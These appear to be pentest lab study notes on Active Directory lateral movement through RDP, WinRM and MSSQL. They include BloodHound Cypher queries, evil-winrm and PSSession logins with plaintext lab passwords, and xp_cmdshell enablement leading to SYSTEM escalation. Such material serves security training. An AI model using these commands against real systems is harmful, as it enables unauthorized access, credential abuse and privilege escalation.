## 🎯 Goal

Once you’ve got *any* domain foothold, you want to move laterally/vertically by abusing:

* **RDP** (GUI access)
* **WinRM / PSRemoting** (PowerShell shell)
* **MSSQL (SQLAdmin)** (OS command execution via SQL Server)

BloodHound + PowerView tell you *where* you can go. RDP / WinRM / SQL tools get you *onto* the box.

---

## 1️⃣ RDP Access (CanRDP)

### Enumerate who can RDP

**PowerView (from Windows):**

```powershell
# Who can RDP to a specific host?
Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Desktop Users"
```

Red flag example:

```text
MemberName : INLANEFREIGHT\Domain Users
```

→ **All Domain Users** can RDP to this host (juicy as hell).

**BloodHound:**

* Look for **`CanRDP` edges**
* Run queries:

  * *Find Workstations where Domain Users can RDP*
  * *Find Servers where Domain Users can RDP*
* On a specific user node → **Node Info → Execution Rights → RDP**

### Use RDP

* From Windows: `mstsc`
* From Linux: `xfreerdp`, Remmina, etc.

Example:

```bash
xfreerdp /u:INLANEFREIGHT\\someuser /p:'Password123!' /v:10.129.x.x
```

Once in: loot creds, look for privilege escalation, pivot further.

---

## 2️⃣ WinRM / PSRemoting (CanPSRemote)

### Enumerate WinRM users

**PowerView:**

```powershell
Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Management Users"
```

Example:

```text
MemberName : INLANEFREIGHT\forend
```

→ `forend` has WinRM access to `ACADEMY-EA-MS01`.

**BloodHound:**

Custom Cypher to find **CanPSRemote**:

```cypher
MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group))
MATCH p2=(u1)-[:CanPSRemote*1..]->(c:Computer)
RETURN p2
```

Save as a custom query for quick reuse.

### Use WinRM from Windows (PowerShell)

```powershell
$password = ConvertTo-SecureString "Klmcargo2" -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential ("INLANEFREIGHT\forend", $password)
Enter-PSSession -ComputerName ACADEMY-EA-MS01 -Credential $cred
```

Now you’re on the box:

```powershell
[ACADEMY-EA-MS01]: PS> hostname
[ACADEMY-EA-MS01]: PS> whoami
[ACADEMY-EA-MS01]: PS> Exit-PSSession
```

### Use WinRM from Linux (evil-winrm)

```bash
gem install evil-winrm    # once

evil-winrm -i 10.129.201.234 -u forend
# then enter password when prompted
```

Then do your normal Windows post-exploitation from that shell.

---

## 3️⃣ MSSQL / SQLAdmin

**Goal:** Find accounts with **SQL sysadmin** rights (SQLAdmin in BloodHound) and turn that into **OS command execution** → often **SYSTEM**.

### Find SQL Admin rights

**BloodHound:**

* Look for **`SQLAdmin`** edges.
* Custom Cypher:

```cypher
MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group))
MATCH p2=(u1)-[:SQLAdmin*1..]->(c:Computer)
RETURN p2
```

Example: `damundsen` → SQLAdmin on `ACADEMY-EA-DB01`.

### Enumerate SQL instances with PowerUpSQL (Windows)

```powershell
Import-Module .\PowerUpSQL.ps1
Get-SQLInstanceDomain
```

Example output:

```text
Instance  : ACADEMY-EA-DB01.INLANEFREIGHT.LOCAL,1433
DomainAccount : damundsen
```

### Run queries / OS commands (PowerUpSQL)

```powershell
Get-SQLQuery -Instance "172.16.5.150,1433" `
             -username "INLANEFREIGHT\damundsen" `
             -password "SQL1234!" `
             -query 'SELECT @@version'
```

From there, you can use PowerUpSQL functions (like enabling xp_cmdshell) or…

### Use mssqlclient.py (Linux, Impacket)

```bash
mssqlclient.py INLANEFREIGHT/DAMUNDSEN@172.16.5.150 -windows-auth
# enter password
```

In the interactive shell:

```text
SQL> help
SQL> enable_xp_cmdshell
SQL> xp_cmdshell "whoami /priv"
```

Look for **`SeImpersonatePrivilege`** → then you can use **JuicyPotato / PrintSpoofer / RoguePotato** to escalate to SYSTEM.

---

## 🔁 Mindset / Workflow

Every time you pop a new user/host:

1. **Re-run BloodHound queries** for:

   * Local Admin
   * CanRDP
   * CanPSRemote
   * SQLAdmin
2. **Check groups** on target hosts:

   * `Remote Desktop Users`
   * `Remote Management Users`
3. **Test any SQL creds** you find (web.config, scripts, dumps).

RDP + WinRM + SQLAdmin = **lateral movement jackpot** even without explicit “local admin” at first glance.

---
